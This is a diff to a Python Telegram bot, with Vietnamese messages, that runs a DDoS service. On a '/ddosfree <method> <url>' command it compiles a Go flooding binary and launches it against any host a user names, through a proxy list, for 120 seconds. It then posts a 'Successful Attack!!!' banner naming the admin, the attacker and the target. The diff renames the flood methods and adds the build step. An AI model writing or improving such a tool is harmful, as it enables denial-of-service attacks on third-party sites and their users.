@@ -1,4 +1,5 @@
 ﻿import telebot
+import subprocess
 import datetime
 import time
 import os
@@ -196,7 +197,7 @@ def ddos_command(message):
     user_id = message.from_user.id
     
     if not is_bot_active:
-        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại')
+        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
     
     if user_id not in allowed_users:
@@ -207,28 +208,50 @@ def ddos_command(message):
         bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /ddosfree <method> <url>')
         return
 
-    method = message.text.split()[1]
+    method = message.text.split()[1].lower()
     host = message.text.split()[2] 
     username = message.from_user.username
+
+    # Biên dịch tệp Go trước khi chạy lệnh
+    try:
+        compile_command = ["go", "build", "-o", "schv1", "cm.go"]
+        subprocess.run(compile_command, check=True)
+    except subprocess.CalledProcessError:
+        bot.reply_to(message, "Có lỗi xảy ra")
+        return
 
     current_time = time.time()
     if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 10:
         remaining_time = int(10 - (current_time - cooldown_dict[username].get('attack', 0)))
         bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh")
         return
-    elif method == "http":
-        command = ["./schv1", "-site", host, "-proxy", "proxy.txt", "-hetb", "-safe"]
-    elif method == "flood":
+    
+    if method == "heta":
         command = ["./schv1", "-site", host, "-proxy", "proxy.txt", "-heta", "-safe"]
+    elif method == "hetb":
+        command = ["./schv1", "-site", host, "-proxy", "proxy.txt", "-hetb", "-safe"]
     else:
-        bot.reply_to(message, 'Method erron\nMethod Start Attack\nflood\nhttp\nHow to run /ddosfree <Method> <url>')
+        bot.reply_to(message, 'Method không hợp lệ.\nCú pháp đúng: /ddosfree <method> <url>\nPhương pháp hỗ trợ:\n- heta : dùng proxy\n- hetb : Không dùng proxy')
         return
 
     cooldown_dict[username] = {'attack': current_time}
 
+    # Chạy lệnh trong một luồng riêng
     attack_thread = threading.Thread(target=run_attack, args=(command, 120, message))
     attack_thread.start()
-    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin : Quang\n  ➤ Tấn Công Bởi » {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 120 «\n  ➤ Methods » {method.upper()} «\n  ➤ Cooldown » 10s «\n  ➤ Plan » Free «')
+    bot.reply_to(
+        message,
+        f'┏━━━━━━━━━━━━━━┓\n'
+        f'┃   Successful Attack!!!\n'
+        f'┗━━━━━━━━━━━━━━➤\n'
+        f'  ┏➤Admin: Quang\n'
+        f'  ➤ Tấn Công Bởi » {username} «\n'
+        f'  ➤ Host » {host} «\n'
+        f'  ➤ TIME » 120 «\n'
+        f'  ➤ Methods » {method.upper()} «\n'
+        f'  ➤ Cooldown » 10s «\n'
+        f'  ➤ Plan » Free «'
+    )
 
 @bot.message_handler(commands=['proxy'])
 def proxy_command(message):
